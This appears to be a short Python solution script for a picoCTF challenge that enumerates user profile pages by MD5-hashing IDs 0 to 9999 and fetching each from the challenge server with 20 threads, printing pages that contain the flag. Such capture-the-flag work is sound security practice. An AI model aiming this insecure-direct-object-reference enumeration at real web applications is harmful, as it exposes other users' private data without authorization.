import hashlib
import requests
from concurrent.futures import ThreadPoolExecutor

session = requests.Session()

def check_user(i):
    md5 = hashlib.md5(str(i).encode()).hexdigest()
    
    res = session.get(f"http://crystal-peak.picoctf.net:52120/profile/user/{md5}/")
    if "pico" in res.text:
        print(f"userID{i}: {res.text}")

with ThreadPoolExecutor(max_workers=20) as executor:
    executor.map(check_user, range(10000))
